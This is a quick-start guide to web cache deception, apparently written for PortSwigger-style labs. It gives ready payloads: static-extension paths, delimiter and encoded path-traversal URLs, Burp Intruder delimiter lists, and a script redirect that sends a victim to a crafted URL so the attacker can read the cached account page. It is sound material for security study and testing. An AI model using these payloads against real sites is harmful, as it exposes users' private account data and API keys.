# Web Cache Deception - Quick Start Guide

## What is Web Cache Deception?

Web cache deception is a vulnerability that tricks web caches into storing sensitive, dynamic content by exploiting URL interpretation discrepancies between cache servers and origin servers.

**In simple terms:** An attacker makes a victim visit a specially crafted URL. The cache thinks it's a static file (like `.js`) and stores the response. The origin server thinks it's a dynamic page (like `/my-account`) and returns sensitive data. The attacker then accesses the cached response to steal the victim's data.

---

## 5-Minute Quick Start

### Step 1: Identify a Target Endpoint (30 seconds)

Find an endpoint that returns sensitive data when authenticated:
```
/my-account
/profile
/api/user
/settings
```

### Step 2: Test Basic Caching (1 minute)

Add a static file extension to the endpoint:
```http
GET /my-account/test.js HTTP/1.1
```

Check the response headers:
- First request: Look for `X-Cache: miss`
- Second request (within 30 seconds): Look for `X-Cache: hit`

If you see this pattern, **the endpoint is vulnerable!**

### Step 3: Craft Your Exploit (1 minute)

Create a unique URL to avoid cache collisions:
```
https://target.com/my-account/victim123.js
```

### Step 4: Deliver to Victim (2 minutes)

Use the exploit server to make the victim visit your URL:
```html
<script>
document.location="https://target.com/my-account/victim123.js"
</script>
```

### Step 5: Steal the Data (30 seconds)

Visit the same URL yourself:
```
https://target.com/my-account/victim123.js
```

The cached response will contain the victim's sensitive data!

---

## Understanding the Attack

### The Core Problem

**Different systems parse URLs differently:**

| System | Interprets | Sees |
|--------|-----------|------|
| Cache Server | `/my-account/test.js` | Static JavaScript file → **CACHE IT** |
| Origin Server | `/my-account/test.js` | Dynamic endpoint `/my-account` → **SERVE DATA** |

**Result:** Sensitive dynamic data gets cached as if it were a static file.

---

## Attack Types

### Type 1: Path Mapping (Easiest)

**When:** Origin server ignores extra path segments.

**Test:**
```http
GET /my-account/random HTTP/1.1  → Returns account data
GET /my-account/random.js HTTP/1.1  → Returns account data + gets cached!
```

**Exploit:**
```
/my-account/unique.js
/profile/data.css
/api/user/info.png
```

---

### Type 2: Delimiter Mismatch

**When:** Cache and origin recognize different delimiter characters.

**Common Delimiter:** `;` (semicolon in Java Spring)

**Test:**
```http
GET /my-account;test HTTP/1.1  → Returns account data
GET /my-account;test.js HTTP/1.1  → Returns account data + gets cached!
```

**Exploit:**
```
/my-account;unique.js
/profile:data.css
/api.user.json
```

**Delimiter List to Try:**
```
; : # ? . $ %00
```

---

### Type 3: Path Traversal (Origin Normalizes)

**When:** Origin server decodes `%2f` and resolves `..` segments; cache doesn't.

**Test:**
```http
GET /resources/..%2fmy-account HTTP/1.1
```

**What happens:**
- Cache sees: `/resources/..%2fmy-account` → Matches static directory rule
- Origin sees: `/resources/../my-account` → Resolves to `/my-account`

**Exploit:**
```
/static/..%2fprofile
/assets/..%2fapi/user
/public/..%2fmy-account
```

---

### Type 4: Path Traversal (Cache Normalizes)

**When:** Cache server decodes and normalizes; origin doesn't.

**Test:**
```http
GET /my-account%23%2f%2e%2e%2fresources HTTP/1.1
```

**What happens:**
- Origin sees: `/my-account` (stops at `%23` delimiter)
- Cache sees: `/my-account#/../resources` → Normalizes to `/resources`

**Exploit:**
```
/profile%23%2f%2e%2e%2fstatic
/api/user%23%2f%2e%2e%2fassets
```

---

## Testing Methodology

### Phase 1: Find Sensitive Endpoints

Look for endpoints that show:
- User account information
- API keys or tokens
- Personal data
- Financial information
- Private settings

**Example endpoints:**
```
/my-account
/profile
/api/me
/api/user
/api/account
/dashboard
/settings
/preferences
```

---

### Phase 2: Test for Vulnerabilities

#### Test 1: Path Abstraction
```http
GET /my-account/random HTTP/1.1
```
**Success:** Returns account data (not 404)

#### Test 2: Static Extension Caching
```http
GET /my-account/random.js HTTP/1.1
```
**Success:** `X-Cache: miss` → `X-Cache: hit` on repeat

#### Test 3: Delimiter Discovery (Use Burp Intruder)

**Setup:**
- Target: `/my-account[POSITION]test`
- Payloads: `; : . ? # $ ! @ % & * + , - = [ ] ^ _ \` { | } ~`
- Grep for: "200 OK"

**Success:** Finding delimiters that return 200

#### Test 4: Normalization
```http
GET /aaa/..%2fmy-account HTTP/1.1
GET /resources/..%2fmy-account HTTP/1.1
```
**Success:** Returns account data

---

### Phase 3: Exploit

1. **Choose working payload type** (from tests above)
2. **Add unique identifier** (avoid cache collisions)
3. **Verify it caches** (X-Cache: hit)
4. **Deliver to victim** (exploit server)
5. **Access cached response** (steal data)

---

## Burp Suite Setup

### Essential Extensions

1. **HTTP Request Smuggler** (for advanced attacks)
2. **Web Cache Deception Scanner** (automated detection)

Install via: Extender → BApp Store

---

### Repeater Configuration

For testing cache behavior:

1. Send request to Repeater (Ctrl+R)
2. **First request:** Check for `X-Cache: miss`
3. **Second request:** Send again, check for `X-Cache: hit`
4. **TTL Test:** Wait 30+ seconds, should see `miss` again

**Key Headers to Watch:**
```
X-Cache: hit/miss
Cache-Control: max-age=30
Age: 15
```

---

### Intruder Configuration for Delimiter Discovery

**Setup:**
1. Send request to Intruder (Ctrl+I)
2. Clear positions
3. Set position: `/my-account[POSITION]test`
4. Payloads tab → Load delimiter list:

```
!
"
#
$
%
&
'
(
)
*
+
,
-
.
/
:
;
<
=
>
?
@
[
\
]
^
_
`
{
|
}
~
```

5. Options → Grep Match → Add: "API Key", "Your account"
6. Start attack
7. Look for 200 responses with matches

---

## Common Payloads

### Static Extensions

Use any extension the cache treats as static:

```
.js
.css
.jpg
.png
.gif
.ico
.svg
.woff
.ttf
.json
.xml
.txt
```

**Example:**
```
/my-account/exploit.js
/profile/data.css
/api/user/info.png
```

---

### Delimiters

Framework-specific delimiters that create discrepancies:

```
/my-account;test.js      # Java Spring
/profile:data.css        # Custom frameworks
/api.user.json           # Ruby on Rails
/account#data.js         # Fragment (use %23)
/settings?info.css       # Query string
```

---

### Path Traversal

When origin normalizes:
```
/static/..%2fmy-account
/assets/..%2fprofile
/public/..%2fapi/user
/resources/..%2fsettings
```

When cache normalizes:
```
/my-account%23%2f%2e%2e%2fstatic
/profile%23%2f%2e%2e%2fassets
/api/user%23%2f%2e%2e%2fpublic
```

---

### Cache Busters

Add unique parameters to avoid collisions:

```
?victim=carlos
?id=123
?unique=abc
?timestamp=1234567890
?session=xyz
```

**Full example:**
```
/my-account/exploit.js?victim=carlos
/my-account;unique.js?id=123
/static/..%2fprofile?cache=bust
```

---

## Detection Indicators

### Vulnerable Patterns

**Vulnerable:**
- Path abstraction works: `/my-account/abc` returns account data
- Static extensions cache: `X-Cache: miss` → `X-Cache: hit`
- Delimiters behave differently between systems
- Normalization discrepancies exist

**Not Vulnerable:**
- Strict path matching: `/my-account/abc` returns 404
- No cache headers present
- `Cache-Control: no-store` on sensitive endpoints
- All URL interpretations match between systems

---

### Key Headers

**Cache Status:**
```http
X-Cache: hit              # Served from cache
X-Cache: miss             # Not cached
```

**Cache Configuration:**
```http
Cache-Control: max-age=30              # Cache for 30 seconds
Cache-Control: no-store                # Never cache
Cache-Control: private                 # Only client caches
Cache-Control: public                  # Any cache can store
```

**Cache Information:**
```http
Age: 15                   # Seconds in cache
Vary: Accept-Encoding     # Cache key variations
X-Served-By: cache-01     # Cache server ID
```

---

## Exploitation Checklist

### Pre-Exploitation
- [ ] Found sensitive endpoint
- [ ] Endpoint returns private data when authenticated
- [ ] Verified cache headers exist
- [ ] Mapped cache rules (extensions/directories)

### Testing
- [ ] Tested path abstraction
- [ ] Discovered working delimiters
- [ ] Verified caching behavior (miss → hit)
- [ ] Identified cache TTL

### Exploitation
- [ ] Crafted unique payload
- [ ] Tested payload caches properly
- [ ] Deployed to exploit server
- [ ] Delivered to victim
- [ ] Accessed cached response
- [ ] Extracted sensitive data

---

## Quick Reference Commands

**Burp Repeater Test:**
```
1. Send request
2. Check X-Cache: miss
3. Resend
4. Verify X-Cache: hit
```

**Burp Intruder Delimiter Scan:**
```
Position: /target[POSITION]test
Payloads: ; : . ? # $ @ ! %
Grep: "200 OK"
```

**Basic Exploit:**
```html
<script>
document.location="https://target.com/endpoint/unique.js"
</script>
```

---

## Resources

- **web security labs:** https://portswigger.net/web-security/web-cache-deception
- **Learning Path:** https://portswigger.net/web-security/learning-paths/web-cache-deception
- **Delimiter List:** https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list
- **Research:** "Gotta cache 'em all" (Black Hat USA 2024)
- **Burp Extension:** Web Cache Deception Scanner (BApp Store)

---

> **See also:** `web-cache-deception-cheat-sheet.md` for comprehensive payloads and techniques, `web-cache-deception-resources.md` for CVEs and learning resources.
